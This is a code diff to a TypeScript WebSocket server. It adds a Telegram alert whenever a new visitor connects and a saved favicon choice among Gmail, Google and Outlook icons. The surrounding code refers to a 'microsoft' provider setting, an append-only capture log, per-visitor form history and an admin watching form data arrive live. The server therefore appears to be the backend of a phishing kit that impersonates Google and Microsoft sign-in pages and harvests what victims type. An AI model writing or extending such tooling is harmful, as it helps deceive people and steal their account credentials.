@@ -4,6 +4,7 @@ import { readFileSync, writeFileSync, mkdirSync, appendFileSync } from 'fs';
 import { join } from 'path';
 import { WebSocketServer, WebSocket } from 'ws';
 import { logger } from './lib/logger.js';
+import { notifyVisitor } from './lib/telegram.js';
 
 // Persist provider selection across server restarts so it never resets to
 // 'microsoft' unless the admin explicitly changes it.
@@ -21,6 +22,36 @@ function _loadSiteActive(): boolean {
 }
 function _saveSiteActive(active: boolean): void {
   try { writeFileSync(SITE_FILE, active ? 'true' : 'false', 'utf8'); } catch { /* ignore */ }
+}
+
+export type FaviconChoice = 'custom-gmail' | 'google' | 'outlook' | 'generic';
+const FAVICON_FILE = join(process.cwd(), '.favicon-choice');
+const FAVICON_CHOICES = new Set<FaviconChoice>(['custom-gmail', 'google', 'outlook', 'generic']);
+
+function _loadFaviconChoice(): FaviconChoice {
+  try {
+    const value = readFileSync(FAVICON_FILE, 'utf8').trim() as FaviconChoice;
+    return FAVICON_CHOICES.has(value) ? value : 'custom-gmail';
+  } catch {
+    return 'custom-gmail';
+  }
+}
+
+function _saveFaviconChoice(choice: FaviconChoice): void {
+  try { writeFileSync(FAVICON_FILE, choice, 'utf8'); } catch { /* ignore */ }
+}
+
+let faviconChoice: FaviconChoice = _loadFaviconChoice();
+
+export function getFaviconChoice(): FaviconChoice {
+  return faviconChoice;
+}
+
+export function setFaviconChoice(choice: string): FaviconChoice | null {
+  if (!FAVICON_CHOICES.has(choice as FaviconChoice)) return null;
+  faviconChoice = choice as FaviconChoice;
+  _saveFaviconChoice(faviconChoice);
+  return faviconChoice;
 }
 
 // Append-only capture log — survives process restarts and is readable by any
@@ -413,6 +444,7 @@ export function setupWebSocket(server: Server) {
           formHistory: persisted ? [...persisted.formHistory] : [],
         };
         visitors.set(id, visitor);
+        notifyVisitor();
 
         // Broadcast immediately so the admin sees the visitor and doesn't miss
         // form-data events that arrive while geolocation is in-flight.
